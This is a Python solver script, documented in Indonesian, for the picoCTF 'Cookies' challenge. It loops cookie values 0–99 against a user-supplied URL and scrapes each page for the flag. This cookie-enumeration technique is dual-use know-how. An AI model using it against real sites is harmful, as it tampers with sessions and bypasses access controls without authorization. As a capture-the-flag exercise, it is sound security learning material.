#!/home/samvivan/Documents/CyberSecurity/picoCTF_Cookies/.venv/bin/python
"""
Skrip ini adalah alat untuk menyelesaikan tantangan picoCTF Cookies. Skrip ini mengirimkan permintaan HTTP ke URL target dengan nilai cookie yang berbeda dan mencari flag dalam respons.

Penggunaan:
1. Jalankan skrip.
2. Masukkan URL target saat diminta.
3. Skrip akan mencoba 100 nilai cookie yang berbeda (0 hingga 99) dan mencetak respons untuk setiap upaya.
4. Jika flag ditemukan dalam respons, skrip akan mencetak flag dengan warna hijau, dan skrip akan keluar.

Skrip ini menggunakan library berikut:
- signal: untuk menangani interupsi keyboard (Ctrl+C)
- sys: untuk keluar dari skrip
- requests: untuk mengirim permintaan HTTP
- BeautifulSoup: untuk mengurai respons HTML

Skrip ini mendefinisikan fungsi berikut:
- check_flag(value): Memeriksa apakah nilai yang diberikan berisi string 'picoCTF'. Jika ya, fungsi ini akan mencetak nilai cookie dan flag dengan warna hijau, dan mengembalikan True.
- signal_handler(sig, frame): Menangani sinyal interupsi keyboard (Ctrl+C) dengan mencetak pesan dalam warna merah dan keluar dari skrip.

Skrip ini juga mendefinisikan beberapa kode escape ANSI untuk output berwarna:
- RED: untuk warna merah
- RESET: untuk mereset warna ke default
- YELLOW: untuk warna kuning
- GREEN: untuk warna hijau

Skrip dimulai dengan mencetak banner dan prompt URL target dalam warna kuning. Kemudian, skrip memasuki loop yang beriterasi dari 0 hingga 99.

Dalam setiap iterasi, skrip:
1. Membuat kamus cookie dengan nilai iterasi saat ini sebagai kunci 'name'.
2. Mengirim permintaan HTTP GET ke URL target dengan cookie.
3. Jika kode status respons adalah 200 (OK):
   a. Mengurai respons HTML menggunakan BeautifulSoup.
   b. Mencari elemen dengan kelas 'jumbotron' dan mengekstrak teksnya.
   c. Memanggil fungsi check_flag dengan teks yang diekstrak.
   d. Jika fungsi check_flag mengembalikan True, skrip akan keluar.
   e. Mencetak nilai cookie dan teks yang diekstrak dalam warna kuning.
4. Jika kode status respons bukan 200, skrip akan melanjutkan ke iterasi berikutnya.

Catatan: Skrip ini hanya untuk tujuan edukasi dan tidak boleh digunakan untuk aktivitas ilegal.
"""

import signal
import sys
import requests
from bs4 import BeautifulSoup

RED = '\033[91m'
RESET = '\033[0m'
YELLOW = '\033[93m'
GREEN = '\033[92m'

print(r"""
  /$$$$$$                      /$$       /$$                    
 /$$__  $$                    | $$      |__/                    
| $$  \__/  /$$$$$$   /$$$$$$ | $$   /$$ /$$  /$$$$$$   /$$$$$$$
| $$       /$$__  $$ /$$__  $$| $$  /$$/| $$ /$$__  $$ /$$_____/
| $$      | $$  \ $$| $$  \ $$| $$$$$$/ | $$| $$$$$$$$|  $$$$$$ 
| $$    $$| $$  | $$| $$  | $$| $$_  $$ | $$| $$_____/ \____  $$
|  $$$$$$/|  $$$$$$/|  $$$$$$/| $$ \  $$| $$|  $$$$$$$ /$$$$$$$/
 \______/  \______/  \______/ |__/  \__/|__/ \_______/|_______/
""")
print(f"picoCTF Cookies Challenge Tool{GREEN}\nhttps://github.com/SamVivan1/picoCTF_Cookies{RESET}\n")

url = input(f"{RED}Target URL:{RESET} {YELLOW}")
print(f"{RED}Searching for flag...{RESET}\n")

def check_flag(value):
    if 'picoCTF' in value:
        print(f'Cookie: {GREEN}{nilai}{RESET}, {GREEN}{value}{RESET}')
        return True

def signal_handler(sig, frame):
    print(f'\n{RED}Terminating program...{RESET}')
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

for i in range(100):
    nilai = str(i)
    cookie = {'name': nilai}
    try:
        response = requests.get(url, cookies=cookie)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            value = soup.find(class_='jumbotron')
            hasil = value.text.strip()
            if check_flag(hasil):
                sys.exit(0)
            print(f"{RESET}Cookie: {YELLOW}{nilai}{RESET}, Value: {YELLOW}{hasil}{RESET}")
        else:
            print(f'Ada error: {response.status_code}')
    except requests.exceptions.RequestException as e:
        print(f'Ada error: {e}')

print('Tidak dapat menemukan flag setelah 100 percobaan.')